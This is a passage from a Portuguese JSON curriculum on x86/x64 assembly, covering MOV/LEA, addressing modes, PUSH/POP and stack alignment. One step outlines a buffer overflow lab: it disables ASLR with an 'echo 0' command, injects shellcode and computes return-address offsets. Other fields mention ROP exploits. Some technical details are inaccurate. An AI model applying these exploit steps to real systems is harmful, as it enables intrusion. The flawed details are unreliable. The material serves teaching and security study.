                              "practicalExample": "Exemplo: Calcular endereço de string e carregar. LEA RAX, [RIP + 0x10] ; endereço de 'Hello'; MOV RDI, RAX ; passa endereço; MOV RSI, [RAX] ; carrega valor se fosse int. Disasseemble: 48 8d 05 0a 00 00 00 (LEA RAX, [RIP+10]).",
                              "finalVerifications": [
                                "Explicar verbalmente 3 diferenças entre MOV e LEA em 64 bits.",
                                "Identificar e explicar RIP-relative em um disassembly fornecido.",
                                "Escrever código assembly que use LEA para endereço e MOV para leitura/escrita correta.",
                                "Prever resultado de um snippet com MOV/LEA sem executar.",
                                "Comparar performance em cenários reais via medição.",
                                "Debugar um erro comum em código fornecido."
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção MOV (valor) vs LEA (endereço).",
                                "Correta identificação e cálculo de RIP-relative offsets.",
                                "Código assembly executável sem erros de segmentação.",
                                "Explicações claras com exemplos concretos.",
                                "Uso apropriado de registradores 64 bits e prefixos REX.",
                                "Compreensão de impactos em ASLR e PIC."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender como compilador gera LEA para &variavel.",
                                "Otimização de Performance: LEA para aritmética vetorizada.",
                                "Segurança Computacional: Análise de exploits em binários (buffer overflow com acessos memória).",
                                "Arquitetura de Computadores: Cache e TLB em acessos memória.",
                                "Engenharia Reversa: Disassembly em ferramentas como IDA Pro."
                              ],
                              "realWorldApplication": "Em análise de malware e reverse engineering, identificar padrões de MOV/LEA em binários para mapear estruturas de dados, detectar shellcodes RIP-relative ou explorar vulnerabilidades de memória em exploits ROP."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.1.3",
                            "name": "Reconhecer modos de endereçamento indireto",
                            "description": "Descrever modos como indireto, baseado em base+offset e escalado, aplicados em operações de memória para acessar estruturas de dados em binários.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Conceitos Fundamentais de Endereçamento Indireto",
                                  "subSteps": [
                                    "Defina endereçamento direto vs. indireto: direto usa endereço fixo, indireto usa registrador ou expressão.",
                                    "Liste tipos: indireto simples [reg], base+offset [reg + disp], indexado [reg1 + reg2], escalado [reg + reg2 * scale + disp].",
                                    "Explique propósito: acessar estruturas dinâmicas como arrays, structs em heap/stack.",
                                    "Compare com x86-32 (SIB byte) vs. x64 (REX prefixo para 64-bit regs).",
                                    "Revise operand size: byte, word, dword, qword."
                                  ],
                                  "verification": "Escreva definições e tipos em um documento; revise com manual Intel.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Manual Intel x86-64 (Volume 2)",
                                    "Notas em texto ou Markdown"
                                  ],
                                  "tips": "Use diagramas de memória para visualizar: desenhe registrador apontando para endereço.",
                                  "learningObjective": "Diferenciar indireto de direto e listar subtipos principais.",
                                  "commonMistakes": [
                                    "Confundir offset imediato com indireto; ignorar escalas em x86."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Sintaxe de Instruções em Assembly x86/x64",
                                  "subSteps": [
                                    "Estude sintaxe: mov eax, [ebx] (indireto simples); mov eax, [ebx + 8] (base+offset).",
                                    "Identifique escalado: mov eax, [ebx + ecx*4] (array de 4 bytes).",
                                    "Pratique decodificação: lea ebx, [esi + edi*8 + 12] (base+index*scale+offset).",
                                    "Diferencie read/write: mov [reg], eax (escrita indireta).",
                                    "Note limitações: x86-32 usa ModR/M + SIB; x64 estende com REX."
                                  ],
                                  "verification": "Decodifique 3 instruções manualmente e compare com disassembler.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Exemplos de código Assembly (GitHub snippets)",
                                    "Disassembler online como Godbolt.org"
                                  ],
                                  "tips": "Sempre leia do manual: procure 'effective address calculation'.",
                                  "learningObjective": "Reconhecer sintaxe exata de modos indiretos em instruções.",
                                  "commonMistakes": [
                                    "Omitir colchetes []; confundir reg com immediate."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Exemplos Práticos de Acesso a Estruturas",
                                  "subSteps": [
                                    "Exemplo struct: mov eax, [ebx + 0x10] (acesso campo offset 16).",
                                    "Array: mov eax, [ebx + ecx*4] (elemento array int).",
                                    "Stack frame: mov eax, [ebp - 0x8] (variável local).",
                                    "Heap alloc: lea eax, [ebx + 0x20] (ponteiro struct dinâmica).",
                                    "Simule em debugger: defina regs e veja memória acessada."
                                  ],
                                  "verification": "Simule 4 exemplos em debugger; capture screenshots de memória.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Debugger como x64dbg ou GDB",
                                    "Código C simples compilado para binário"
                                  ],
                                  "tips": "Compile C com -O0 para preservar acessos indiretos claros.",
                                  "learningObjective": "Aplicar modos indiretos a cenários reais de dados.",
                                  "commonMistakes": [
                                    "Assumir offset fixo sem contexto struct; ignorar endianness."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Reconhecimento em Disassembly de Binários",
                                  "subSteps": [
                                    "Disasseble binário: objdump -d programa.exe | grep mov.*\\[",
                                    "Classifique 10 instruções: marque indireto simples/base+offset/escalado.",
                                    "Ignore direto: filtre [constante] como direto.",
                                    "Analise fluxo: trace acessos em loop/ifs para estruturas.",
                                    "Crie tabela: instrução | modo | estrutura provável."
                                  ],
                                  "verification": "Classifique 10+ instruções corretamente (90% acerto); auto-avaliação.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Binários de teste (crackmes.one)",
                                    "IDA Free ou Ghidra"
                                  ],
                                  "tips": "Procure padrões: loops com [reg + idx*size] = array scan.",
                                  "learningObjective": "Identificar modos indiretos rapidamente em binários reais.",
                                  "commonMistakes": [
                                    "Classificar [rip + disp] como indireto (é RIP-relative direto); confundir com LEA."
                                  ]
                                }
                              ],
                              "practicalExample": "Em disassembly de um binário: 'mov eax, dword ptr [esi + ecx*4 + 0x10]' – reconheça como indireto base(esi)+index(ecx)*scale(4)+offset(0x10), acessando elemento de array de structs no offset 16.",
                              "finalVerifications": [
                                "Classifique corretamente 8/10 instruções de disassembly como indiretas ou não.",
                                "Explique cálculo de endereço efetivo para base+offset+scale.",
                                "Diferencie indireto em x86-32 vs x64 em 3 exemplos.",
                                "Trace um fluxo de 5 instruções acessando struct em debugger.",
                                "Liste 3 usos em acessos de pilha/heap."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de modos (90%+ correto).",
                                "Explicações claras com cálculo de endereço.",
                                "Uso correto de terminologia (SIB, ModR/M, scale).",
                                "Análise contextual (struct/array vs aleatório).",
                                "Eficiência: tempo <2min por instrução complexa.",
                                "Ausência de confusão com modos diretos/relativos."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: ponteiros e arrays (*p + i*sizeof).",
                                "Arquitetura de Computadores: cálculo de endereço efetivo (EIP+offset).",
                                "Segurança: exploits em acessos indiretos (format strings, heap overflows).",
                                "Sistemas Operacionais: gerenciamento de stack/heap frames.",
                                "Engenharia Reversa: padrões em malware loaders."
                              ],
                              "realWorldApplication": "Em análise de segurança computacional, reconhecer modos indiretos em binários permite mapear estruturas de dados (ex: credenciais em memória), detectar buffer overflows em loops escalados e desenvolver payloads para ROP chains acessando gadgets indiretos."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.4.2",
                        "name": "Uso da Pilha com PUSH e POP",
                        "description": "Manipulação da pilha de execução usando instruções PUSH e POP em 32 e 64 bits, incluindo efeitos no registrador ESP/RSP.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.4.2.1",
                            "name": "Executar PUSH em Assembly 32 bits",
                            "description": "Explicar como PUSH decrementa ESP em 4 bytes e armazena valor no topo da pilha, com exemplos de salvamento de registradores antes de chamadas de função.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito da pilha e o registrador ESP em Assembly 32 bits",
                                  "subSteps": [
                                    "Estude a pilha como estrutura LIFO (Last In, First Out) que cresce para baixos endereços.",
                                    "Identifique o registrador ESP como ponteiro para o topo da pilha.",
                                    "Aprenda que em 32 bits, cada PUSH/POP opera com 4 bytes (word).",
                                    "Visualize o layout da memória: pilha inicia em alto endereço e decrementa.",
                                    "Revise convenções de chamada (cdecl/stdcall) onde pilha é usada para parâmetros."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito como ESP aponta para o topo e por que a pilha cresce para baixo; desenhe um diagrama da pilha antes/depois de um PUSH.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação Intel x86 Manual (Volume 2)",
                                    "Emulador como DOSBox ou QEMU",
                                    "Ferramenta de visualização de memória (ex: x32dbg)"
                                  ],
                                  "tips": "Use diagramas para visualizar mudanças em ESP; lembre-se que pilha é alocada em segmento SS.",
                                  "learningObjective": "Entender o papel fundamental da pilha e ESP no modelo de memória x86 32 bits.",
                                  "commonMistakes": [
                                    "Confundir crescimento da pilha (para baixo) com heap (para cima)",
                                    "Ignorar alinhamento de 4 bytes em 32 bits",
                                    "Esquecer que ESP é atualizado atomicamente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar PUSH de valor imediato",
                                  "subSteps": [
                                    "Escreva código assembly simples: 'push 0x12345678'.",
                                    "Compile e carregue no debugger (ex: GDB ou OllyDbg).",
                                    "Execute passo a passo (F7/F8) e observe ESP decrementar em 4 bytes.",
                                    "Verifique o valor armazenado em [ESP] que deve ser 0x12345678.",
                                    "Repita com diferentes valores para confirmar consistência."
                                  ],
                                  "verification": "No debugger, confirme que ESP diminuiu exatamente 4 bytes e [ESP] contém o valor pushado; tire screenshot.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Assembler NASM ou MASM",
                                    "Debugger GDB ou x32dbg",
                                    "Editor de texto (VS Code com extensão Assembly)"
                                  ],
                                  "tips": "Use 'info registers' no GDB para monitorar ESP em tempo real; evite valores nulos que podem confundir.",
                                  "learningObjective": "Dominar a sintaxe e efeito de PUSH imediato no topo da pilha.",
                                  "commonMistakes": [
                                    "Esquecer de alinhar o valor (use dword ptr)",
                                    "Não pausar no breakpoint para inspecionar memória",
                                    "Confundir little-endian na visualização de bytes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar PUSH de registrador",
                                  "subSteps": [
                                    "Carregue um registrador: 'mov eax, 0xDEADBEEF'.",
                                    "Execute 'push eax' e observe o mesmo decremento de ESP.",
                                    "Inspecione [ESP] para confirmar que eax foi copiado corretamente.",
                                    "Teste com múltiplos registradores (ebx, ecx) em sequência.",
                                    "Compare com PUSH imediato para notar diferenças de performance."
                                  ],
                                  "verification": "Debugger mostra ESP -4 e [ESP] == valor do registrador; execute 'x/1x $esp' no GDB.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Mesmo setup do step anterior",
                                    "Exemplos de código prontos para teste"
                                  ],
                                  "tips": "Sempre preserve registradores voláteis; PUSH é mais eficiente que MOV + SUB ESP para registradores.",
                                  "learningObjective": "Aplicar PUSH para copiar conteúdo de registradores na pilha de forma eficiente.",
                                  "commonMistakes": [
                                    "PUSH de registrador de 8/16 bits sem extensão",
                                    "Não limpar registrador antes (resíduos)",
                                    "Sobrescrever pilha sem POP correspondente"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar PUSH em salvamento de registradores antes de chamada de função",
                                  "subSteps": [
                                    "Escreva prologo de função: push ebp; mov ebp, esp.",
                                    "Salve registradores callee-saved: push ebx; push esi; push edi.",
                                    "Chame uma função (ex: printf) e observe uso da pilha.",
                                    "Restaure com POP na ordem reversa após retorno.",
                                    "Debugue para ver stack frame completo formado."
                                  ],
                                  "verification": "Execute call, retorne e confirme que registradores foram restaurados corretamente sem corrupção.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Biblioteca libc para funções como printf",
                                    "Debugger com suporte a calls (GDB)",
                                    "Código fonte completo de exemplo"
                                  ],
                                  "tips": "Siga convenção: PUSH na ordem de salvamento, POP reversa para evitar desalinhamento.",
                                  "learningObjective": "Integrar PUSH em fluxos reais de função para preservação de estado.",
                                  "commonMistakes": [
                                    "Ordem errada de POP (causa corrupção)",
                                    "Esquecer push ebp no prologo",
                                    "Não alinhar stack para SSE (add esp,12 se necessário)"
                                  ]
                                }
                              ],
                              "practicalExample": "Código Assembly exemplo:\nsection .text\nglobal _start\n_start:\n    mov eax, 0x12345678\n    push eax\n    push 0xDEADBEEF  ; PUSH imediato\n    call printf     ; Simula chamada, pilha com 2 dwords\n    add esp, 8      ; Limpa pilha (cdecl)\n    ; Visualize: ESP decrementou 8 bytes, topo tem 0xDEADBEEF",
                              "finalVerifications": [
                                "Explicar precisamente: PUSH faz sub esp,4 seguido de mov [esp], valor.",
                                "Em debugger, demonstrar ESP -4 e valor correto em [ESP] para imediato e registrador.",
                                "Montar sequência de 3 PUSH e mostrar stack frame com endereços corretos.",
                                "Identificar e corrigir erro em código com PUSH desbalanceado.",
                                "Desenhar diagrama da pilha mostrando alinhamento e convenções de chamada.",
                                "Executar código que salva/restaura registradores sem perda de dados."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição do decremento de ESP em 4 bytes (32 bits).",
                                "Correta identificação de PUSH como operação atômica de store-after-adjust.",
                                "Uso correto de debugger para verificação de memória e registradores.",
                                "Aplicação em contexto de prologo/epilogo de funções.",
                                "Evitar erros comuns como desalinhamento ou ordem de POP.",
                                "Explicação clara de little-endian na visualização da pilha."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Aritmética de ponteiros e operações modulares em endereços.",
                                "Algoritmos: Implementação prática de pilha como estrutura de dados.",
                                "Programação de Alto Nível: Entender como C compila funções em PUSH/POP.",
                                "Segurança Computacional: Análise de stack overflows via manipulação de ESP.",
                                "Arquitetura de Computadores: Modelo de memória segmentada x86."
                              ],
                              "realWorldApplication": "Em análise de binários para segurança, entender PUSH permite dissecar prologos de funções, detectar ROP chains em exploits e debugar crashes de stack em reverse engineering de malware ou vulnerabilidades como buffer overflows."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.2.2",
                            "name": "Executar POP em Assembly 64 bits",
                            "description": "Demonstrar como POP incrementa RSP em 8 bytes e carrega valor do topo para registrador, destacando convenções de calling em x86-64.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o funcionamento básico da instrução POP em x86-64",
                                  "subSteps": [
                                    "Estude a definição: POP carrega o valor de 8 bytes do endereço apontado por RSP em um registrador e incrementa RSP em 8 bytes.",
                                    "Compare com PUSH: PUSH decrementa RSP e armazena; POP é o inverso.",
                                    "Revise convenções de calling: POP é usado para restaurar registradores após chamadas de função.",
                                    "Analise o formato da instrução: POP reg (ex: POP RAX).",
                                    "Entenda alinhamento: pilha deve estar alinhada a 16 bytes em chamadas."
                                  ],
                                  "verification": "Escreva um resumo de 3 frases explicando o efeito de POP em RSP e no registrador destino.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86-64 Manual (Volume 2)",
                                    "Editor de texto como VS Code"
                                  ],
                                  "tips": "Visualize a pilha crescendo para endereços menores (downwards); POP 'remove' do topo movendo RSP para cima.",
                                  "learningObjective": "Explicar precisamente como POP modifica RSP e carrega dados na memória.",
                                  "commonMistakes": [
                                    "Confundir incremento/decremento de RSP com PUSH",
                                    "Ignorar tamanho de 8 bytes em 64 bits",
                                    "Esquecer alinhamento da pilha"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar ambiente de desenvolvimento para Assembly x86-64",
                                  "subSteps": [
                                    "Instale NASM (montador) e GDB (debugger) no Linux ou use um emulador como DOSBox.",
                                    "Crie um arquivo .asm simples com seções .text, .data e .bss.",
                                    "Escreva um esqueleto de programa: global _start, sys_exit.",
                                    "Compile: nasm -f elf64 arquivo.asm -o arquivo.o; ld arquivo.o -o executavel.",
                                    "Teste execução básica com ./executavel."
                                  ],
                                  "verification": "Compile e execute um 'Hello World' em Assembly sem erros.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "NASM",
                                    "GDB",
                                    "Linux terminal ou WSL",
                                    "Exemplo de código boilerplate"
                                  ],
                                  "tips": "Use -g flag no NASM para debug: nasm -f elf64 -g arquivo.asm.",
                                  "learningObjective": "Preparar ferramentas para codificar, montar e debugar código Assembly.",
                                  "commonMistakes": [
                                    "Esquecer seção .text",
                                    "Usar formato errado (-f elf64 para 64 bits)",
                                    "Não linkar com ld"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Escrever e executar código com instrução POP",
                                  "subSteps": [
                                    "Escreva código: PUSH RAX (salve valor conhecido, ex: mov rax, 0x123456789ABCDEF0; push rax).",
                                    "Adicione POP RBX para carregar em outro registrador.",
                                    "Inclua saída para verificar: use syscall write para imprimir valor de RBX.",
                                    "Compile e execute o binário.",
                                    "Observe saída para confirmar valor carregado."
                                  ],
                                  "verification": "O programa executa e imprime o valor esperado de RBX.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Editor de código",
                                    "NASM e LD",
                                    "GDB opcional"
                                  ],
                                  "tips": "Use valores hex visíveis como 0xDEADBEEF para facilitar verificação.",
                                  "learningObjective": "Implementar PUSH seguido de POP em código funcional.",
                                  "commonMistakes": [
                                    "Não inicializar registrador antes de PUSH",
                                    "Erro de sintaxe em registradores (use maiúsculas)",
                                    "Pilha desalinhada causando crash"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Debugar e analisar o impacto de POP com GDB",
                                  "subSteps": [
                                    "Execute gdb ./executavel; defina breakpoint antes de POP (break *endereco).",
                                    "Use info registers para ver RSP inicial; stepi até POP.",
                                    "Execute POP com si; verifique info reg: RSP +8 e registrador destino atualizado.",
                                    "Examine memória: x/8gx $rsp para topo da pilha antes/depois.",
                                    "Relacione com calling conventions: POP RBP restaura frame pointer."
                                  ],
                                  "verification": "Screenshot ou log mostrando RSP incrementado em 0x8 e valor carregado corretamente.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "GDB",
                                    "Programa compilado com -g"
                                  ],
                                  "tips": "Comando 'x/s $rsp' para strings; 'ni' para next instruction ignorando calls.",
                                  "learningObjective": "Verificar dinamicamente as mudanças causadas por POP na pilha e registradores.",
                                  "commonMistakes": [
                                    "Não usar breakpoints corretos",
                                    "Confundir RSP com RBP",
                                    "Ignorar little-endian na memória"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Aplicar POP em contexto de convenções de calling",
                                  "subSteps": [
                                    "Estude ABI System V: caller salva callee-saved regs via PUSH/POP.",
                                    "Modifique código: simule função com PUSH RBP; mov rbp,rsp; ... POP RBP antes de ret.",
                                    "Debugue para ver restauração de RBP e RSP alinhado.",
                                    "Teste desalinhamento intencional e observe crashes.",
                                    "Documente como POP evita stack corruption em calls."
                                  ],
                                  "verification": "Código simula call/return sem crash, RSP restaurado corretamente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação ABI x86-64",
                                    "GDB avançado"
                                  ],
                                  "tips": "Consulte pdf 'System V ABI AMD64' para regs callee-saved (RBX, RBP, R12-15).",
                                  "learningObjective": "Integrar POP às convenções de calling em x86-64.",
                                  "commonMistakes": [
                                    "Não salvar/restaurar callee-saved",
                                    "PUSH/POP ordem errada",
                                    "Esquecer alinhamento 16 bytes"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um programa: mov rax, 0x4141414141414141; push rax; pop rbx; syscall write(1, rbx, 8) para imprimir 'AAAAAAAA' confirmando carga de 8 bytes em RBX, com RSP +8 pós-POP.",
                              "finalVerifications": [
                                "RSP incrementa exatamente 8 bytes após POP (ver GDB: info reg rsp).",
                                "Registrador destino recebe valor exato do topo da pilha (x/1gx $reg).",
                                "Código compila, linka e executa sem segmentation fault.",
                                "Simulação de call/return restaura RSP e RBP corretamente.",
                                "Alinhamento da pilha mantido (RSP % 16 == 0 antes de calls).",
                                "Memória lida em little-endian ordem confirmada."
                              ],
                              "assessmentCriteria": [
                                "Explicação precisa do mecanismo POP (incremento RSP + carga reg).",
                                "Código funcional com PUSH/POP e saída verificável.",
                                "Análise GDB correta de registradores e memória pré/pós-POP.",
                                "Correta aplicação em convenções de calling sem erros de pilha.",
                                "Identificação e correção de erros comuns como desalinhamento.",
                                "Documentação clara com screenshots/logs de debug."
                              ],
                              "crossCurricularConnections": [
                                "Linguagem C: Entender como funções usam pilha para locals e params.",
                                "Sistemas Operacionais: Gerenciamento de stack em context switches.",
                                "Segurança Computacional: Exploração de ROP (Return-Oriented Programming) usa POP chains.",
                                "Engenharia de Software: Otimização de prolog/epilog de funções.",
                                "Arquitetura de Computadores: Modelo de pilha vs registradores."
                              ],
                              "realWorldApplication": "Em análise de malware/reverse engineering, debugar binários para entender restauração de registradores via POP, detectando calls aninhadas ou exploits de stack overflow que manipulam RSP."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.2.3",
                            "name": "Comparar PUSH/POP em 32 vs 64 bits",
                            "description": "Identificar diferenças de tamanho (32-bit vs 64-bit pushes) e impactos em exploits como buffer overflow.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Conceitos Básicos de PUSH e POP em Arquitetura x86 (32-bit)",
                                  "subSteps": [
                                    "Explicar que PUSH diminui ESP em 4 bytes e armazena o valor na pilha.",
                                    "Demonstrar POP que aumenta ESP em 4 bytes e carrega o valor para o registrador.",
                                    "Analisar o impacto no ponteiro de pilha (ESP) com diagramas de memória.",
                                    "Compilar e disassemblar um código simples usando NASM para 32-bit.",
                                    "Usar GDB para observar mudanças em registradores durante execução."
                                  ],
                                  "verification": "Disassemblar um programa simples e confirmar que PUSH/POP afetam 4 bytes em ESP.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "NASM",
                                    "GDB",
                                    "Objdump",
                                    "Editor de texto"
                                  ],
                                  "tips": "Sempre verifique o modo de operação (32-bit) com 'objdump -d' antes de analisar.",
                                  "learningObjective": "Compreender o funcionamento exato de PUSH/POP em 32-bit e seu efeito na pilha.",
                                  "commonMistakes": [
                                    "Confundir ESP com EBP",
                                    "Ignorar alinhamento de pilha",
                                    "Não observar o decremento/incremento de 4 bytes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar PUSH e POP em Arquitetura x86-64 (64-bit)",
                                  "subSteps": [
                                    "Explicar que PUSH diminui RSP em 8 bytes e armazena o valor de 64-bit.",
                                    "Demonstrar POP que aumenta RSP em 8 bytes e carrega para registrador de 64-bit.",
                                    "Comparar registradores: RSP vs ESP, RAX vs EAX.",
                                    "Compilar código assembly para 64-bit e disassemblar com objdump.",
                                    "Usar GDB em modo 64-bit para step-through e inspecionar pilha."
                                  ],
                                  "verification": "Executar código 64-bit no GDB e confirmar decremento/incremento de 8 bytes em RSP.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "NASM (modo 64-bit)",
                                    "GDB",
                                    "Objdump",
                                    "Sistema 64-bit"
                                  ],
                                  "tips": "Use 'set architecture i386:x86-64' no GDB para modo correto.",
                                  "learningObjective": "Identificar mecânicas de PUSH/POP em 64-bit e diferenças iniciais em tamanho.",
                                  "commonMistakes": [
                                    "Assumir tamanhos de 32-bit em 64-bit",
                                    "Misturar registradores 32/64-bit",
                                    "Esquecer convenções de chamada AMD64"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Diferenças Diretas entre PUSH/POP 32-bit e 64-bit",
                                  "subSteps": [
                                    "Listar diferenças: tamanho da operação (4 vs 8 bytes), registradores (ESP/RSP).",
                                    "Criar tabela comparativa de encodings de instruções via objdump.",
                                    "Simular pilha em papel/diagrama para overflows simulados.",
                                    "Executar PUSH múltiplos em ambos modos e medir offset na pilha.",
                                    "Analisar impactos em alinhamento de pilha (32-bit: 4-byte, 64-bit: 8/16-byte)."
                                  ],
                                  "verification": "Gerar tabela ou diagrama mostrando pelo menos 5 diferenças chave.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Objdump",
                                    "GDB",
                                    "Planilha ou diagrama digital"
                                  ],
                                  "tips": "Compare dumps hexadecimais das instruções para ver bytes exatos.",
                                  "learningObjective": "Mapear todas as diferenças estruturais e operacionais entre 32 e 64-bit.",
                                  "commonMistakes": [
                                    "Ignorar diferenças em registradores de uso geral",
                                    "Não considerar modo de endereço",
                                    "Confundir com instruções PUSH de memória"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Impactos em Exploits de Buffer Overflow",
                                  "subSteps": [
                                    "Simular buffer overflow em 32-bit: calcular offset para EIP (4 bytes).",
                                    "Simular em 64-bit: offset para RIP (8 bytes), considerar ASLR/ Canary.",
                                    "Comparar payloads: shellcode menor impacto em 64-bit devido a espaço maior.",
                                    "Testar em ambiente controlado com código C + assembly injetado.",
                                    "Discutir mitigações: NX bit, stack canaries mais largos em 64-bit."
                                  ],
                                  "verification": "Demonstrar overflow bem-sucedido em ambos modos com payloads ajustados.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "GCC",
                                    "NASM",
                                    "GDB",
                                    "Buffer overflow lab ambiente (ex: protostar)"
                                  ],
                                  "tips": "Desative ASLR temporariamente com 'echo 0 > /proc/sys/kernel/randomize_va_space'.",
                                  "learningObjective": "Entender como diferenças afetam design e sucesso de exploits.",
                                  "commonMistakes": [
                                    "Não ajustar payload size para arquitetura",
                                    "Ignorar convenções de pilha (argc/argv em 64-bit)",
                                    "Esquecer endianness"
                                  ]
                                }
                              ],
                              "practicalExample": "Escreva um programa C com buffer de 32 bytes. Compile para 32-bit (gcc -m32) e 64-bit. Use GDB para overflow: em 32-bit, ~36 bytes para EIP; em 64-bit, ~40 bytes para RIP devido a maiores pushes de frame/prologue. Injete shellcode e compare sucesso.",
                              "finalVerifications": [
                                "Explicar verbalmente 3 diferenças principais em PUSH/POP.",
                                "Disassemblar e apontar tamanhos em código real.",
                                "Simular overflow e calcular offsets corretos para ambas arquiteturas.",
                                "Criar diagrama de pilha mostrando estados pós-PUSH múltiplos.",
                                "Identificar por que exploits 32-bit são mais previsíveis que 64-bit."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de tamanhos (4 vs 8 bytes): 100% correto.",
                                "Correta análise de impactos em registradores e pilha.",
                                "Demonstração prática via GDB/objdump sem erros.",
                                "Explicação clara de implicações em buffer overflows.",
                                "Uso correto de terminologia (ESP/RSP, EIP/RIP)."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Registradores e gerenciamento de memória.",
                                "Programação em C: Convenções de chamada e stack frames.",
                                "Segurança Cibernética: Desenvolvimento de exploits e defesas (ASLR, NX).",
                                "Engenharia Reversa: Disassembly e debugging multi-arquitetura."
                              ],
                              "realWorldApplication": "Em pentesting e análise de malware, entender diferenças permite adaptar exploits para binários 32/64-bit, como em CTFs (ex: ROP chains ajustadas) ou auditorias de software legado vs moderno."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.4.3",
                        "name": "Alinhamento de Memória e Pilha",
                        "description": "Princípios de alinhamento de dados e pilha em arquiteturas 32 e 64 bits para otimização e conformidade com ABIs.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.4.3.1",
                            "name": "Verificar alinhamento da pilha em 32 bits",
                            "description": "Compreender alinhamento de 4 bytes para ESP em x86-32 e penalidades de performance por desalinhamento em acessos de memória.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Conceitos Básicos de Alinhamento da Pilha em x86-32",
                                  "subSteps": [
                                    "Estude a arquitetura x86-32 e o papel do registrador ESP como ponteiro da pilha.",
                                    "Aprenda que o alinhamento de 4 bytes (32 bits) é padrão para ESP, significando que o endereço deve ser múltiplo de 4.",
                                    "Revise como pushes e pops afetam o ESP (sub/esp 4 para push, add/esp 4 para pop).",
                                    "Analise diagramas de pilha mostrando endereços alinhados vs. desalinhados.",
                                    "Leia a documentação Intel sobre requisitos de alinhamento para acessos de memória."
                                  ],
                                  "verification": "Resuma em suas palavras o que é alinhamento de 4 bytes para ESP e por que é importante.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Intel x86-32 manuals (Volume 1)",
                                    "Ferramenta de visualização de pilha como StackView ou diagramas online"
                                  ],
                                  "tips": "Use um simulador como x86emu para visualizar mudanças no ESP sem hardware real.",
                                  "learningObjective": "Compreender o conceito de alinhamento da pilha e seu impacto na arquitetura x86-32.",
                                  "commonMistakes": [
                                    "Confundir alinhamento de 4 bytes com 8 bytes (que é para x86-64)",
                                    "Ignorar que alinhamento é endereço % 4 == 0"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Verificar o Alinhamento do ESP em Código Assembly",
                                  "subSteps": [
                                    "Escreva um programa assembly simples que imprima ou exiba o valor atual do ESP.",
                                    "Use instruções como 'mov eax, esp' seguido de 'and eax, 3' para checar os 2 bits baixos (deve ser 0 para alinhado).",
                                    "Compile e execute com NASM e ld, depois debugue com GDB.",
                                    "Insira pushes intencionais desalinhados (ex: push byte) e verifique ESP % 4 != 0.",
                                    "Crie um loop que cheque alinhamento antes e depois de operações de pilha."
                                  ],
                                  "verification": "Execute o código no GDB e confirme que ESP & 3 == 0 em pontos alinhados.",
